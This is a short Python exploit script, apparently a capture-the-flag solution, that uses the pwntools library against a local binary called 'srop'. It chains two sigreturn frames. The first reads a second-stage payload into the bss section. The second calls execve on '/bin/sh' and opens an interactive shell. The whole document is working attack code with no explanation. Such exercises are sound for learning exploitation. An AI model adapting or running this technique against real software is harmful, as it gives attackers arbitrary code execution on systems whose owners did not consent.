#!/bin/usr/python3

from pwn import *

context.arch = 'x86_64'
p = process("./srop")
e = ELF('./srop')

gadget = 0x00000000004004eb
syscall = 0x00000000004004ec
read_got = e.got['read']
bss = e.bss()

# read(0, bss, 0x1000)
frame1 = SigreturnFrame()
frame1.rax = 0
frame1.rip = syscall
frame1.rdi = 0
frame1.rsp = bss
frame1.rsi = bss
frame1.rdx = 0x1000

payload = b'A'*0x10 + b'B'*0x8
payload += p64(gadget)
payload += p64(15)
payload += bytes(frame1)

p.sendline(payload)

frame2 = SigreturnFrame()
frame2.rax = 0x3b
frame2.rip = syscall
frame2.rdi = bss+0x108

rop = p64(gadget)
rop += p64(15)
rop += bytes(frame2)
rop += b'/bin/sh\x00'

p.sendline(rop)

p.interactive()
